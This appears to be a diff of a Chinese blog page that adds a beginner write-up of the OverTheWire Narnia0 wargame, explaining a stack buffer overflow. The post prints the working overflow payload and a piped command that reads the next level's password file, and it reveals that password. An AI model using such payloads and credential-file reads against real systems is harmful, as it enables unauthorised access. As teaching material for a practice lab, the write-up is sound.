@@ -12,7 +12,7 @@
     
     <title>
         
-            归档: 2017/9 | 
+            十分简单的PWN，overthewire之Narnia0 | 
         
         AresX&#39;s Blog
     </title>
@@ -40,7 +40,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="AresX">
     <meta name="description" itemprop="description" content="There is no description">
-    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客">
+    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,PWN,Writeup,Overthewire">
 
     <!-- Site Verification -->
     <meta name="google-site-verification" content="rVqEDFDRIznSgfyvSoh7KIxfhwh6uxZtvgO_Vxr-QDs" />
@@ -69,15 +69,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="https://ares-x.com">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="归档: 2017/9 | AresX&#39;s Blog">
+    <meta property="og:title" content="十分简单的PWN，overthewire之Narnia0 | AresX&#39;s Blog">
     <meta property="og:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png" />
     <meta property="og:description" content="There is no description">
-    
+    <meta property="og:article:tag" content="PWN"> <meta property="og:article:tag" content="Writeup"> <meta property="og:article:tag" content="Overthewire"> 
 
+    
+        <meta property="article:published_time" content="9月 02, 2017" />
+        <meta property="article:modified_time" content="9月 02, 2017" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="归档: 2017/9 | AresX&#39;s Blog">
+    <meta name="twitter:title" content="十分简单的PWN，overthewire之Narnia0 | AresX&#39;s Blog">
     <meta name="twitter:description" content="There is no description">
     <meta name="twitter:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -85,13 +88,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://ares-x.com/archives/2017/09/index.html" />
+        <link rel="canonical" href="https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "AresX&#39;s Blog",
+        "logo": "https://cache-1253916356.file.myqcloud.com/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "AresX",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://cache-1253916356.file.myqcloud.com/img/favicon.png"
+        },
+        "description": "Anarchy is the key"
+    },
+    "headline": "十分简单的PWN，overthewire之Narnia0",
+    "url": "https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html",
+    "datePublished": "9月 02, 2017",
+    "dateModified": "9月 02, 2017",
+    "description": "There is no description",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://ares-x.com"
+    }
+}
+</script>
 
 
     
@@ -274,156 +307,375 @@
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
     
-
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
-
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/02/十分简单的PWN，overthewire之Narnia0/">十分简单的PWN，overthewire之Narnia0</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            十分简单的PWN，...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/02/十分简单的PWN，overthewire之Narnia0/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="AresX's avatar">
-            </div>
-            <div>
-                <strong>AresX</strong>
-                <span>9月 02, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                <a class="post_category-link" href="/categories/CTF/">CTF</a>
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
             </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
+        </a>
     </div>
-</div>
+    -->
 
-            
-            
-        
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
     
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
-    
-        
-            <!-- Random Thumbnail -->
-            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#十分简单的PWN，overthewire之Narnia0"><span class="post-toc-number">1.</span> <span class="post-toc-text">十分简单的PWN，overthewire之Narnia0</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
     
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/09/02/编译安装Shadowsocks-qt5/">编译安装Shadowsocks_qt5</a></p>
-    </div>
 
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            #通过编译安装ss-qt5
-安装 ...
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/09/02/编译安装Shadowsocks-qt5/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="AresX's avatar">
-            </div>
-            <div>
-                <strong>AresX</strong>
-                <span>9月 02, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
                 
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
+    <!-- Paradox Post Header -->
+    
         
-    
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', 'https://cache-1253916356.file.myqcloud.com/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', 'https://cache-1253916356.file.myqcloud.com/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                十分简单的PWN，overthewire之Narnia0
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>AresX</strong>
+        <span>9月 02, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="https://pan.baidu.com/share/qrcode?w=246&h=246&url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/">
+    
+</ul>
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/Overthewire/">Overthewire</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/PWN/">PWN</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Writeup/">Writeup</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=十分简单的PWN，overthewire之Narnia0&url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=十分简单的PWN，overthewire之Narnia0&url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html&via=AresX" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html&title=十分简单的PWN，overthewire之Narnia0" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 LinkedIn
+            </li>
+        </a>
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=十分简单的PWN，overthewire之Narnia0&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/index.html&text=十分简单的PWN，overthewire之Narnia0" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Telegram
+            </li>
+        </a>
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h2 id="十分简单的PWN，overthewire之Narnia0"><a href="#十分简单的PWN，overthewire之Narnia0" class="headerlink" title="十分简单的PWN，overthewire之Narnia0"></a>十分简单的PWN，overthewire之Narnia0</h2><p><em>第一次做pwn题目，缘由在《THE HACKER PLAYBOOK2》中第一章有提及，并且作者带着做了一遍，觉得很有意思，于是记录下了自己的一些理解</em></p>
+<p>*<a href="http://overthewire.org/wargames/narnia/" target="_blank" rel="external">题目网站</a></p>
+<hr>
+<p>首先登录题目服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh narnia0@narnia.labs.overthewire.org</div><div class="line">Password:narnia0</div><div class="line">cd</div><div class="line">cd /narnia/</div></pre></td></tr></table></figure></p>
+<p><code>ls</code>看到题目文件:<code>narnia0.c</code></p>
+<p>看一下源码</p>
+<pre><code>cat narnia0.c
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">    long val=0x41414141;</div><div class="line">    char buf[20];</div><div class="line"></div><div class="line">    printf(&quot;Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);</div><div class="line">    printf(&quot;Here is your chance: &quot;);</div><div class="line">    scanf(&quot;%24s&quot;,&amp;buf);</div><div class="line"></div><div class="line">    printf(&quot;buf: %s\n&quot;,buf);</div><div class="line">    printf(&quot;val: 0x%08x\n&quot;,val);</div><div class="line"></div><div class="line">    if(val==0xdeadbeef)</div><div class="line">        system(&quot;/bin/sh&quot;);</div><div class="line">    else &#123;</div><div class="line">        printf(&quot;WAY OFF!!!!\n&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>读一遍代码，是一个十分简单的C语言程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">首先对变量val进行赋值，然后申请了一个20字节的字符数组buf</div><div class="line"></div><div class="line">之后输出题目要求，获取用户对数组buf的输入</div><div class="line"></div><div class="line">用户输入后输出用户的输入和val的16进制值</div><div class="line"></div><div class="line">如果val的值与特定的数值匹配，则调用`/bin/sh`</div><div class="line"></div><div class="line">不匹配则输出失败信息</div></pre></td></tr></table></figure></p>
+<p>首先,题目要求是把val的值从<code>0x41414141</code>改变成<code>0xdeadbeef</code></p>
+<p>但是程序并没有提供修改<code>val</code>变量的可写入函数</p>
+<p>浏览代码，发现第五行变量<code>val</code>被赋值为:<code>0x41414141</code></p>
+<p>查看Ascii码表，算出对应字符串为:<code>AAAA</code><br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1504366763690&amp;di=6687ad195002154e5e4ac340ca4d9872&amp;imgtype=0&amp;src=http%3A%2F%2Fs2.sinaimg.cn%2Fmiddle%2F56d8ea90tac5177d3a0d1%26690" alt="Ascii码表"></p>
+<p>在第6行<code>char buf[20]</code>说明程序接受输入的缓冲区长度为20字节</p>
+<p>而在第10行<code>scanf()</code>函数允许最多输入长度为24字节，于是造成了缓冲区溢出，溢出的这4个字节就是达成目的的关键</p>
+<p>测试一下输入24个字节后溢出的四个字节会造成什么样的后果</p>
+<p>运行程序:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">narnia0@narnia:/narnia$ ./narnia0        </div><div class="line">Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!</div><div class="line">Here is your chance:</div></pre></td></tr></table></figure></p>
+<p>在这里程序在等待用户输入，也就是执行到了<code>scanf(&quot;%24s&quot;,&amp;buf)</code>函数</p>
+<p>输入20个A 加上<code>BCDE</code>来测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Here is your chance: AAAAAAAAAAAAAAAAAAAABCDE</div><div class="line">buf: AAAAAAAAAAAAAAAAAAAABCDE</div><div class="line">val: 0x45444342</div><div class="line">WAY OFF!!!!</div></pre></td></tr></table></figure>
+<p>输出了<code>val: 0x45444342</code> 而对应的ascii即是<code>EDCB</code>,这说明可以修改内存中<code>val</code>的值！溢出的四个字节覆盖到了<code>val</code>上</p>
+<p>注意这里的顺序,输入的最后是<code>BCDE</code>,但显示的顺序是<code>EDCB</code></p>
+<p><strong>因为栈机制是先进后出/后进先出,及如果依次入栈为1234,依次出栈的顺序就是4321,这点十分重要</strong></p>
+<p>现在要做的就算把<code>val</code>的值变成<code>0xdeadbeef</code></p>
+<p>注意<code>0xdeadbeef</code>并不是一串字符串，而是一个16进制数,8位的16进制数占4个字节</p>
+<p>所以在输入的时候顺序要为:<code>\xef\xbe\xad\xde</code> 及<code>A*20+\xef\xbe\xad\xde</code></p>
+<p>如何获得这串16进制数<code>\xef\xbe\xad\xde</code>对应的字符串呢？</p>
+<p>在Python中，可以使用<code>\x</code>对字符串进行转义，把输入的字符串当成16进制输出对应的字符</p>
+<p>如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; print &quot;\x41&quot;</div><div class="line">&gt;&gt;&gt; A</div></pre></td></tr></table></figure></p>
+<p>及输出了16进制数<code>41</code>对应的Ascii字符<code>A</code></p>
+<p>那么输出<code>\xef\xbe\xad\xde</code>对应的字符即:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;print &quot;\xef\xbe\xad\xde&quot;</div><div class="line">&gt;&gt;&gt;ﾭ�</div></pre></td></tr></table></figure>
+<p>但是由于各种奇怪的编码问题这个不存在的字符串你是不可能读懂的，即使能也会是乱码，因为根本没有字符去对应那串16进制码,但是计算机能懂就够了</p>
+<p>于是需要用到Linux中的“管道”功能，即把一个程序的输出作为另一个程序的输入</p>
+<p>例如:<code>netstat -an | grep 445</code><br><code>netstat -an</code>会列出所有端口，而<code>grep 445</code>则会进行筛选，只保留有445这个字符串的结果</p>
+<p>同理,如果要把Python程序的输出结果当做题目程序的输入，同样需要这个技巧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">narnia0@narnia:/narnia$ python -c &apos;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&apos; | ./narnia0</div><div class="line">Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!</div><div class="line">Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�</div><div class="line">val: 0xdeadbeef</div></pre></td></tr></table></figure>
+<p>这句话:<code>python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0</code></p>
+<p><em>因为在这里不需要进入交互模式，<code>python -c &#39;xxx&#39;</code>命令会直接执行单引号中的代码，而不是在交互中进行<br>如果不加<code>-c</code>参数，直接执行<code>python xxxxx</code> ,系统则会去匹配当前目录下的<code>xxxxx</code>文件试图去用Python解释器执行</em></p>
+<p><em><code>|</code>即为管道，把<code>|</code>左边的输出结果当做输入传递给<code>|</code>右边的程序</em></p>
+<p>这时看变量<code>val</code>的值，已经变成了<code>0xdeadbeef</code>,多出的四个字节成功覆盖在了内存中变量<code>val</code>储存的位置</p>
+<p>再次查看C语言代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.  `if(val==0xdeadbeef)`</div><div class="line">2.  `system(&quot;/bin/sh&quot;);`</div></pre></td></tr></table></figure>
+<p>如果<code>val</code>的值变成了<code>0xdeadbeef</code>，程序将会调用<code>/bin/sh</code></p>
+<p>第二题的密码在<code>etc/narnia_pass/narnia1</code> 如果直接查看会提示权限不够</p>
+<p>因此运行Python代码同时读取位于<code>etc/narnia_pass/narnia1</code>中的密钥:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">narnia0@narnia:/narnia$ (python -c &apos;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&apos;;echo &apos;cat /etc/narnia_pass/narnia1&apos;) | ./narnia0</div><div class="line">Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!</div><div class="line">Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�</div><div class="line">val: 0xdeadbeef</div><div class="line">efeidiedae</div></pre></td></tr></table></figure></p>
+<p>成功显示出了密钥，即下一道题的ssh密码</p>
+<hr>
+<p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>
+
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #D3D3D3;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load"> 
+    <button class="disqus_click_btn">阅读评论（请确保 disqus 可以正常加载）</button>
+</div>
+
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'https://ares-x.com/2017/09/02/十分简单的PWN，overthewire之Narnia0/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/ls-javascript" id="disqus-lazy-load-script">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//ares-x-com.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+  	
+
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2017/09/02/编译安装Shadowsocks-qt5/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
